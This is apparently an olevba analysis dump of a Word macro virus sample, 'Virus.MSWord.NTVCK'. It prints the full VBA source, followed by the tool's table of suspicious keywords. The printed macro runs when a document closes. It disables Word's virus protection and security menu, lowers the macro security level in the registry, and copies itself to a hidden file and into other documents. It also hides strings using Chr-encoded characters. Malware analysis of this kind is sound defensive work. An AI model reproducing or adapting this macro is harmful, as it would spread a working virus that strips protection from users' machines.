olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NTVCK
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NTVCK - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ntvck.bas 
in file: Virus.MSWord.NTVCK - OLE stream: 'Macros/VBA/ntvck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub ntvck()

    ' NTVCK
    ' ==================================
    ' Code by Necronomikon[ZeroGravity]
    ' ==================================
    ' W2KM.ntvck
    ' ==================================

'VirusName: ntvck
'Author Name: nec
'Date and Time:09.02.04 19:39:38
On Error Resume Next
ActiveDocument.ReadOnlyRecommended = False
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayStatusBar = False
Options.ConfirmConversions = False
Options.VirusProtection = False
CommandBars(" Macro ").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.SaveNormalPrompt = False
If NormalTemplate.VBProject.VBComponents.Item("ntvck").Name <> "ntvck" Then
ActiveDocument.VBProject.VBComponents("ntvck").Export ("C:\Windows\ntvck.drv")
SetAttr "C:\Windows\ntvck.drv", 6
End If
If ActiveDocument.VBProject.VBComponents.Item("ntvck").Name <> "ntvck" Then
ActiveDocument.VBProject.VBComponents.import ("C:\Windows\ntvck .drv ")
ActiveDocument.Save
 End If
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110)
.Comments = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(119) + Chr(97) + Chr(115) + Chr(32) + Chr(99) + Chr(114) + Chr(101) + Chr(97) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(78) + Chr(84) + Chr(86) + Chr(67) + Chr(75) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110)
.Keywords = Chr(32) + Chr(82) + Chr(101) + Chr(97) + Chr(100) + Chr(121) + Chr(32) + Chr(82) + Chr(97) + Chr(110) + Chr(103) + Chr(101) + Chr(114) + Chr(115) + Chr(32) + Chr(76) + Chr(105) + Chr(98) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(110) + Chr(116)
.Execute
End With

If Day(Now()) = 31 Then Msgbox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(119) + Chr(97) + Chr(115) + Chr(32) + Chr(99) + Chr(114) + Chr(101) + Chr(97) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(78) + Chr(84) + Chr(86) + Chr(67) + Chr(75) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110)
End Sub
Sub AutoClose()
    On Error Resume Next
Call ntvck
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

